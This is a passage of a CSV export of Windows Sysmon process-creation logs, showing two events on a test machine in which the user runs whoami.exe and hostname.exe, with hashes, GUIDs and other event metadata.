      <TimeCreated SystemTime=""2023-12-27T19:01:59.7685055Z""/>
      
            
      <EventRecordID>19569</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:01:59.766</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-74a7-658c-be01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">5868</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\whoami.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">whoami - displays logged on user information</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">whoami.exe</Data>
      
            
      <Data Name=""CommandLine"">""C:\Windows\system32\whoami.exe""</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\HOSTNAME.EXE""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\,Hostname APP,,1,19568,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=E1EA6EFF1F45AA136A2A2E18EACC1F73,SHA256=4634E6685E402CC3CC8843589F4E8D8AC515F5F05D319E835A262B69B32BDB45,IMPHASH=23013EDF627646AB5226D15AC880BAD8",C:\Windows\System32\HOSTNAME.EXE,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,hostname.exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-74a7-658c-bd01-000000000f00},3588,10556,Microsoft® Windows® Operating System,,,,-,2023-12-27T19:01:59.7392652Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:01:59.738,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:01:59.7392652Z""/>
      
            
      <EventRecordID>19568</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:01:59.738</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-74a7-658c-bd01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10556</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\HOSTNAME.EXE</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Hostname APP</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">hostname.exe</Data>
      
            
      <Data Name=""CommandLine"">""C:\Windows\system32\HOSTNAME.EXE""</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=E1EA6EFF1F45AA136A2A2E18EACC1F73,SHA256=4634E6685E402CC3CC8843589F4E8D8AC515F5F05D319E835A262B69B32BDB45,IMPHASH=23013EDF627646AB5226D15AC880BAD8</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  


"
